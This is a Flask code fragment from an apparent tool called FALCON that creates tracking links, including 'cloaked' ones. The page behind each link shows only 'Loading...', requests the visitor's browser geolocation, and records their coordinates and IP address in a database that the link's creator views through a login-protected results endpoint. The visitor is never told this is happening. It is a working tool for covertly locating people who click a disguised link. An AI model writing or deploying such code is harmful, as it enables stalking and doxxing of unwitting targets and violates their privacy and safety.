@app.route("/api/link/generate", methods=["POST"])
@auth.login_required
def api_link_generate():
    import uuid, sqlite3
    link_id = str(uuid.uuid4())[:8]
    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
    conn = sqlite3.connect(db)
    conn.execute("INSERT INTO link_tracker (id, created, ip, lat, lon, user_agent) VALUES (?,?,?,?,?,?)",
                 (link_id, datetime.now().isoformat(), "pending", "pending", "pending", "pending"))
    conn.commit(); conn.close()
    return jsonify({"success": True, "link": request.host_url + "t/" + link_id, "cloaked": request.host_url + "c/" + link_id})

@app.route("/t/<link_id>", methods=["GET"])
def link_target(link_id):
    return f"""<!DOCTYPE html><html><head><script>
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(
            (pos) => {{ fetch("/api/link/catch?link_id={link_id}&lat=" + pos.coords.latitude + "&lon=" + pos.coords.longitude); document.body.innerHTML='<h2>شكراً لك</h2>'; }},
            (err) => {{ fetch("/api/link/catch?link_id={link_id}&lat=denied&lon=denied"); document.body.innerHTML='<h2>يجب السماح بالموقع</h2>'; }}
        );
    }}</script></head><body style="background:#07111f;color:white;text-align:center;padding:50px;font-family:Arial"><h3>Loading...</h3></body></html>"""

@app.route("/api/link/catch")
def api_link_catch():
    import sqlite3
    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
    conn = sqlite3.connect(db)
    conn.execute("UPDATE link_tracker SET ip=?, lat=?, lon=? WHERE id=?", (request.remote_addr, request.args.get("lat"), request.args.get("lon"), request.args.get("link_id")))
    conn.commit(); conn.close()
    return jsonify({"status": "ok"})

@app.route("/api/link/results")
@auth.login_required
def api_link_results():
    import sqlite3
    db = os.path.join(os.path.expanduser("~/FALCON"), "data", "falcon.db")
    conn = sqlite3.connect(db); conn.row_factory = sqlite3.Row
    rows = conn.execute("SELECT * FROM link_tracker ORDER BY created DESC LIMIT 20").fetchall()
    conn.close()
    return jsonify([dict(r) for r in rows])

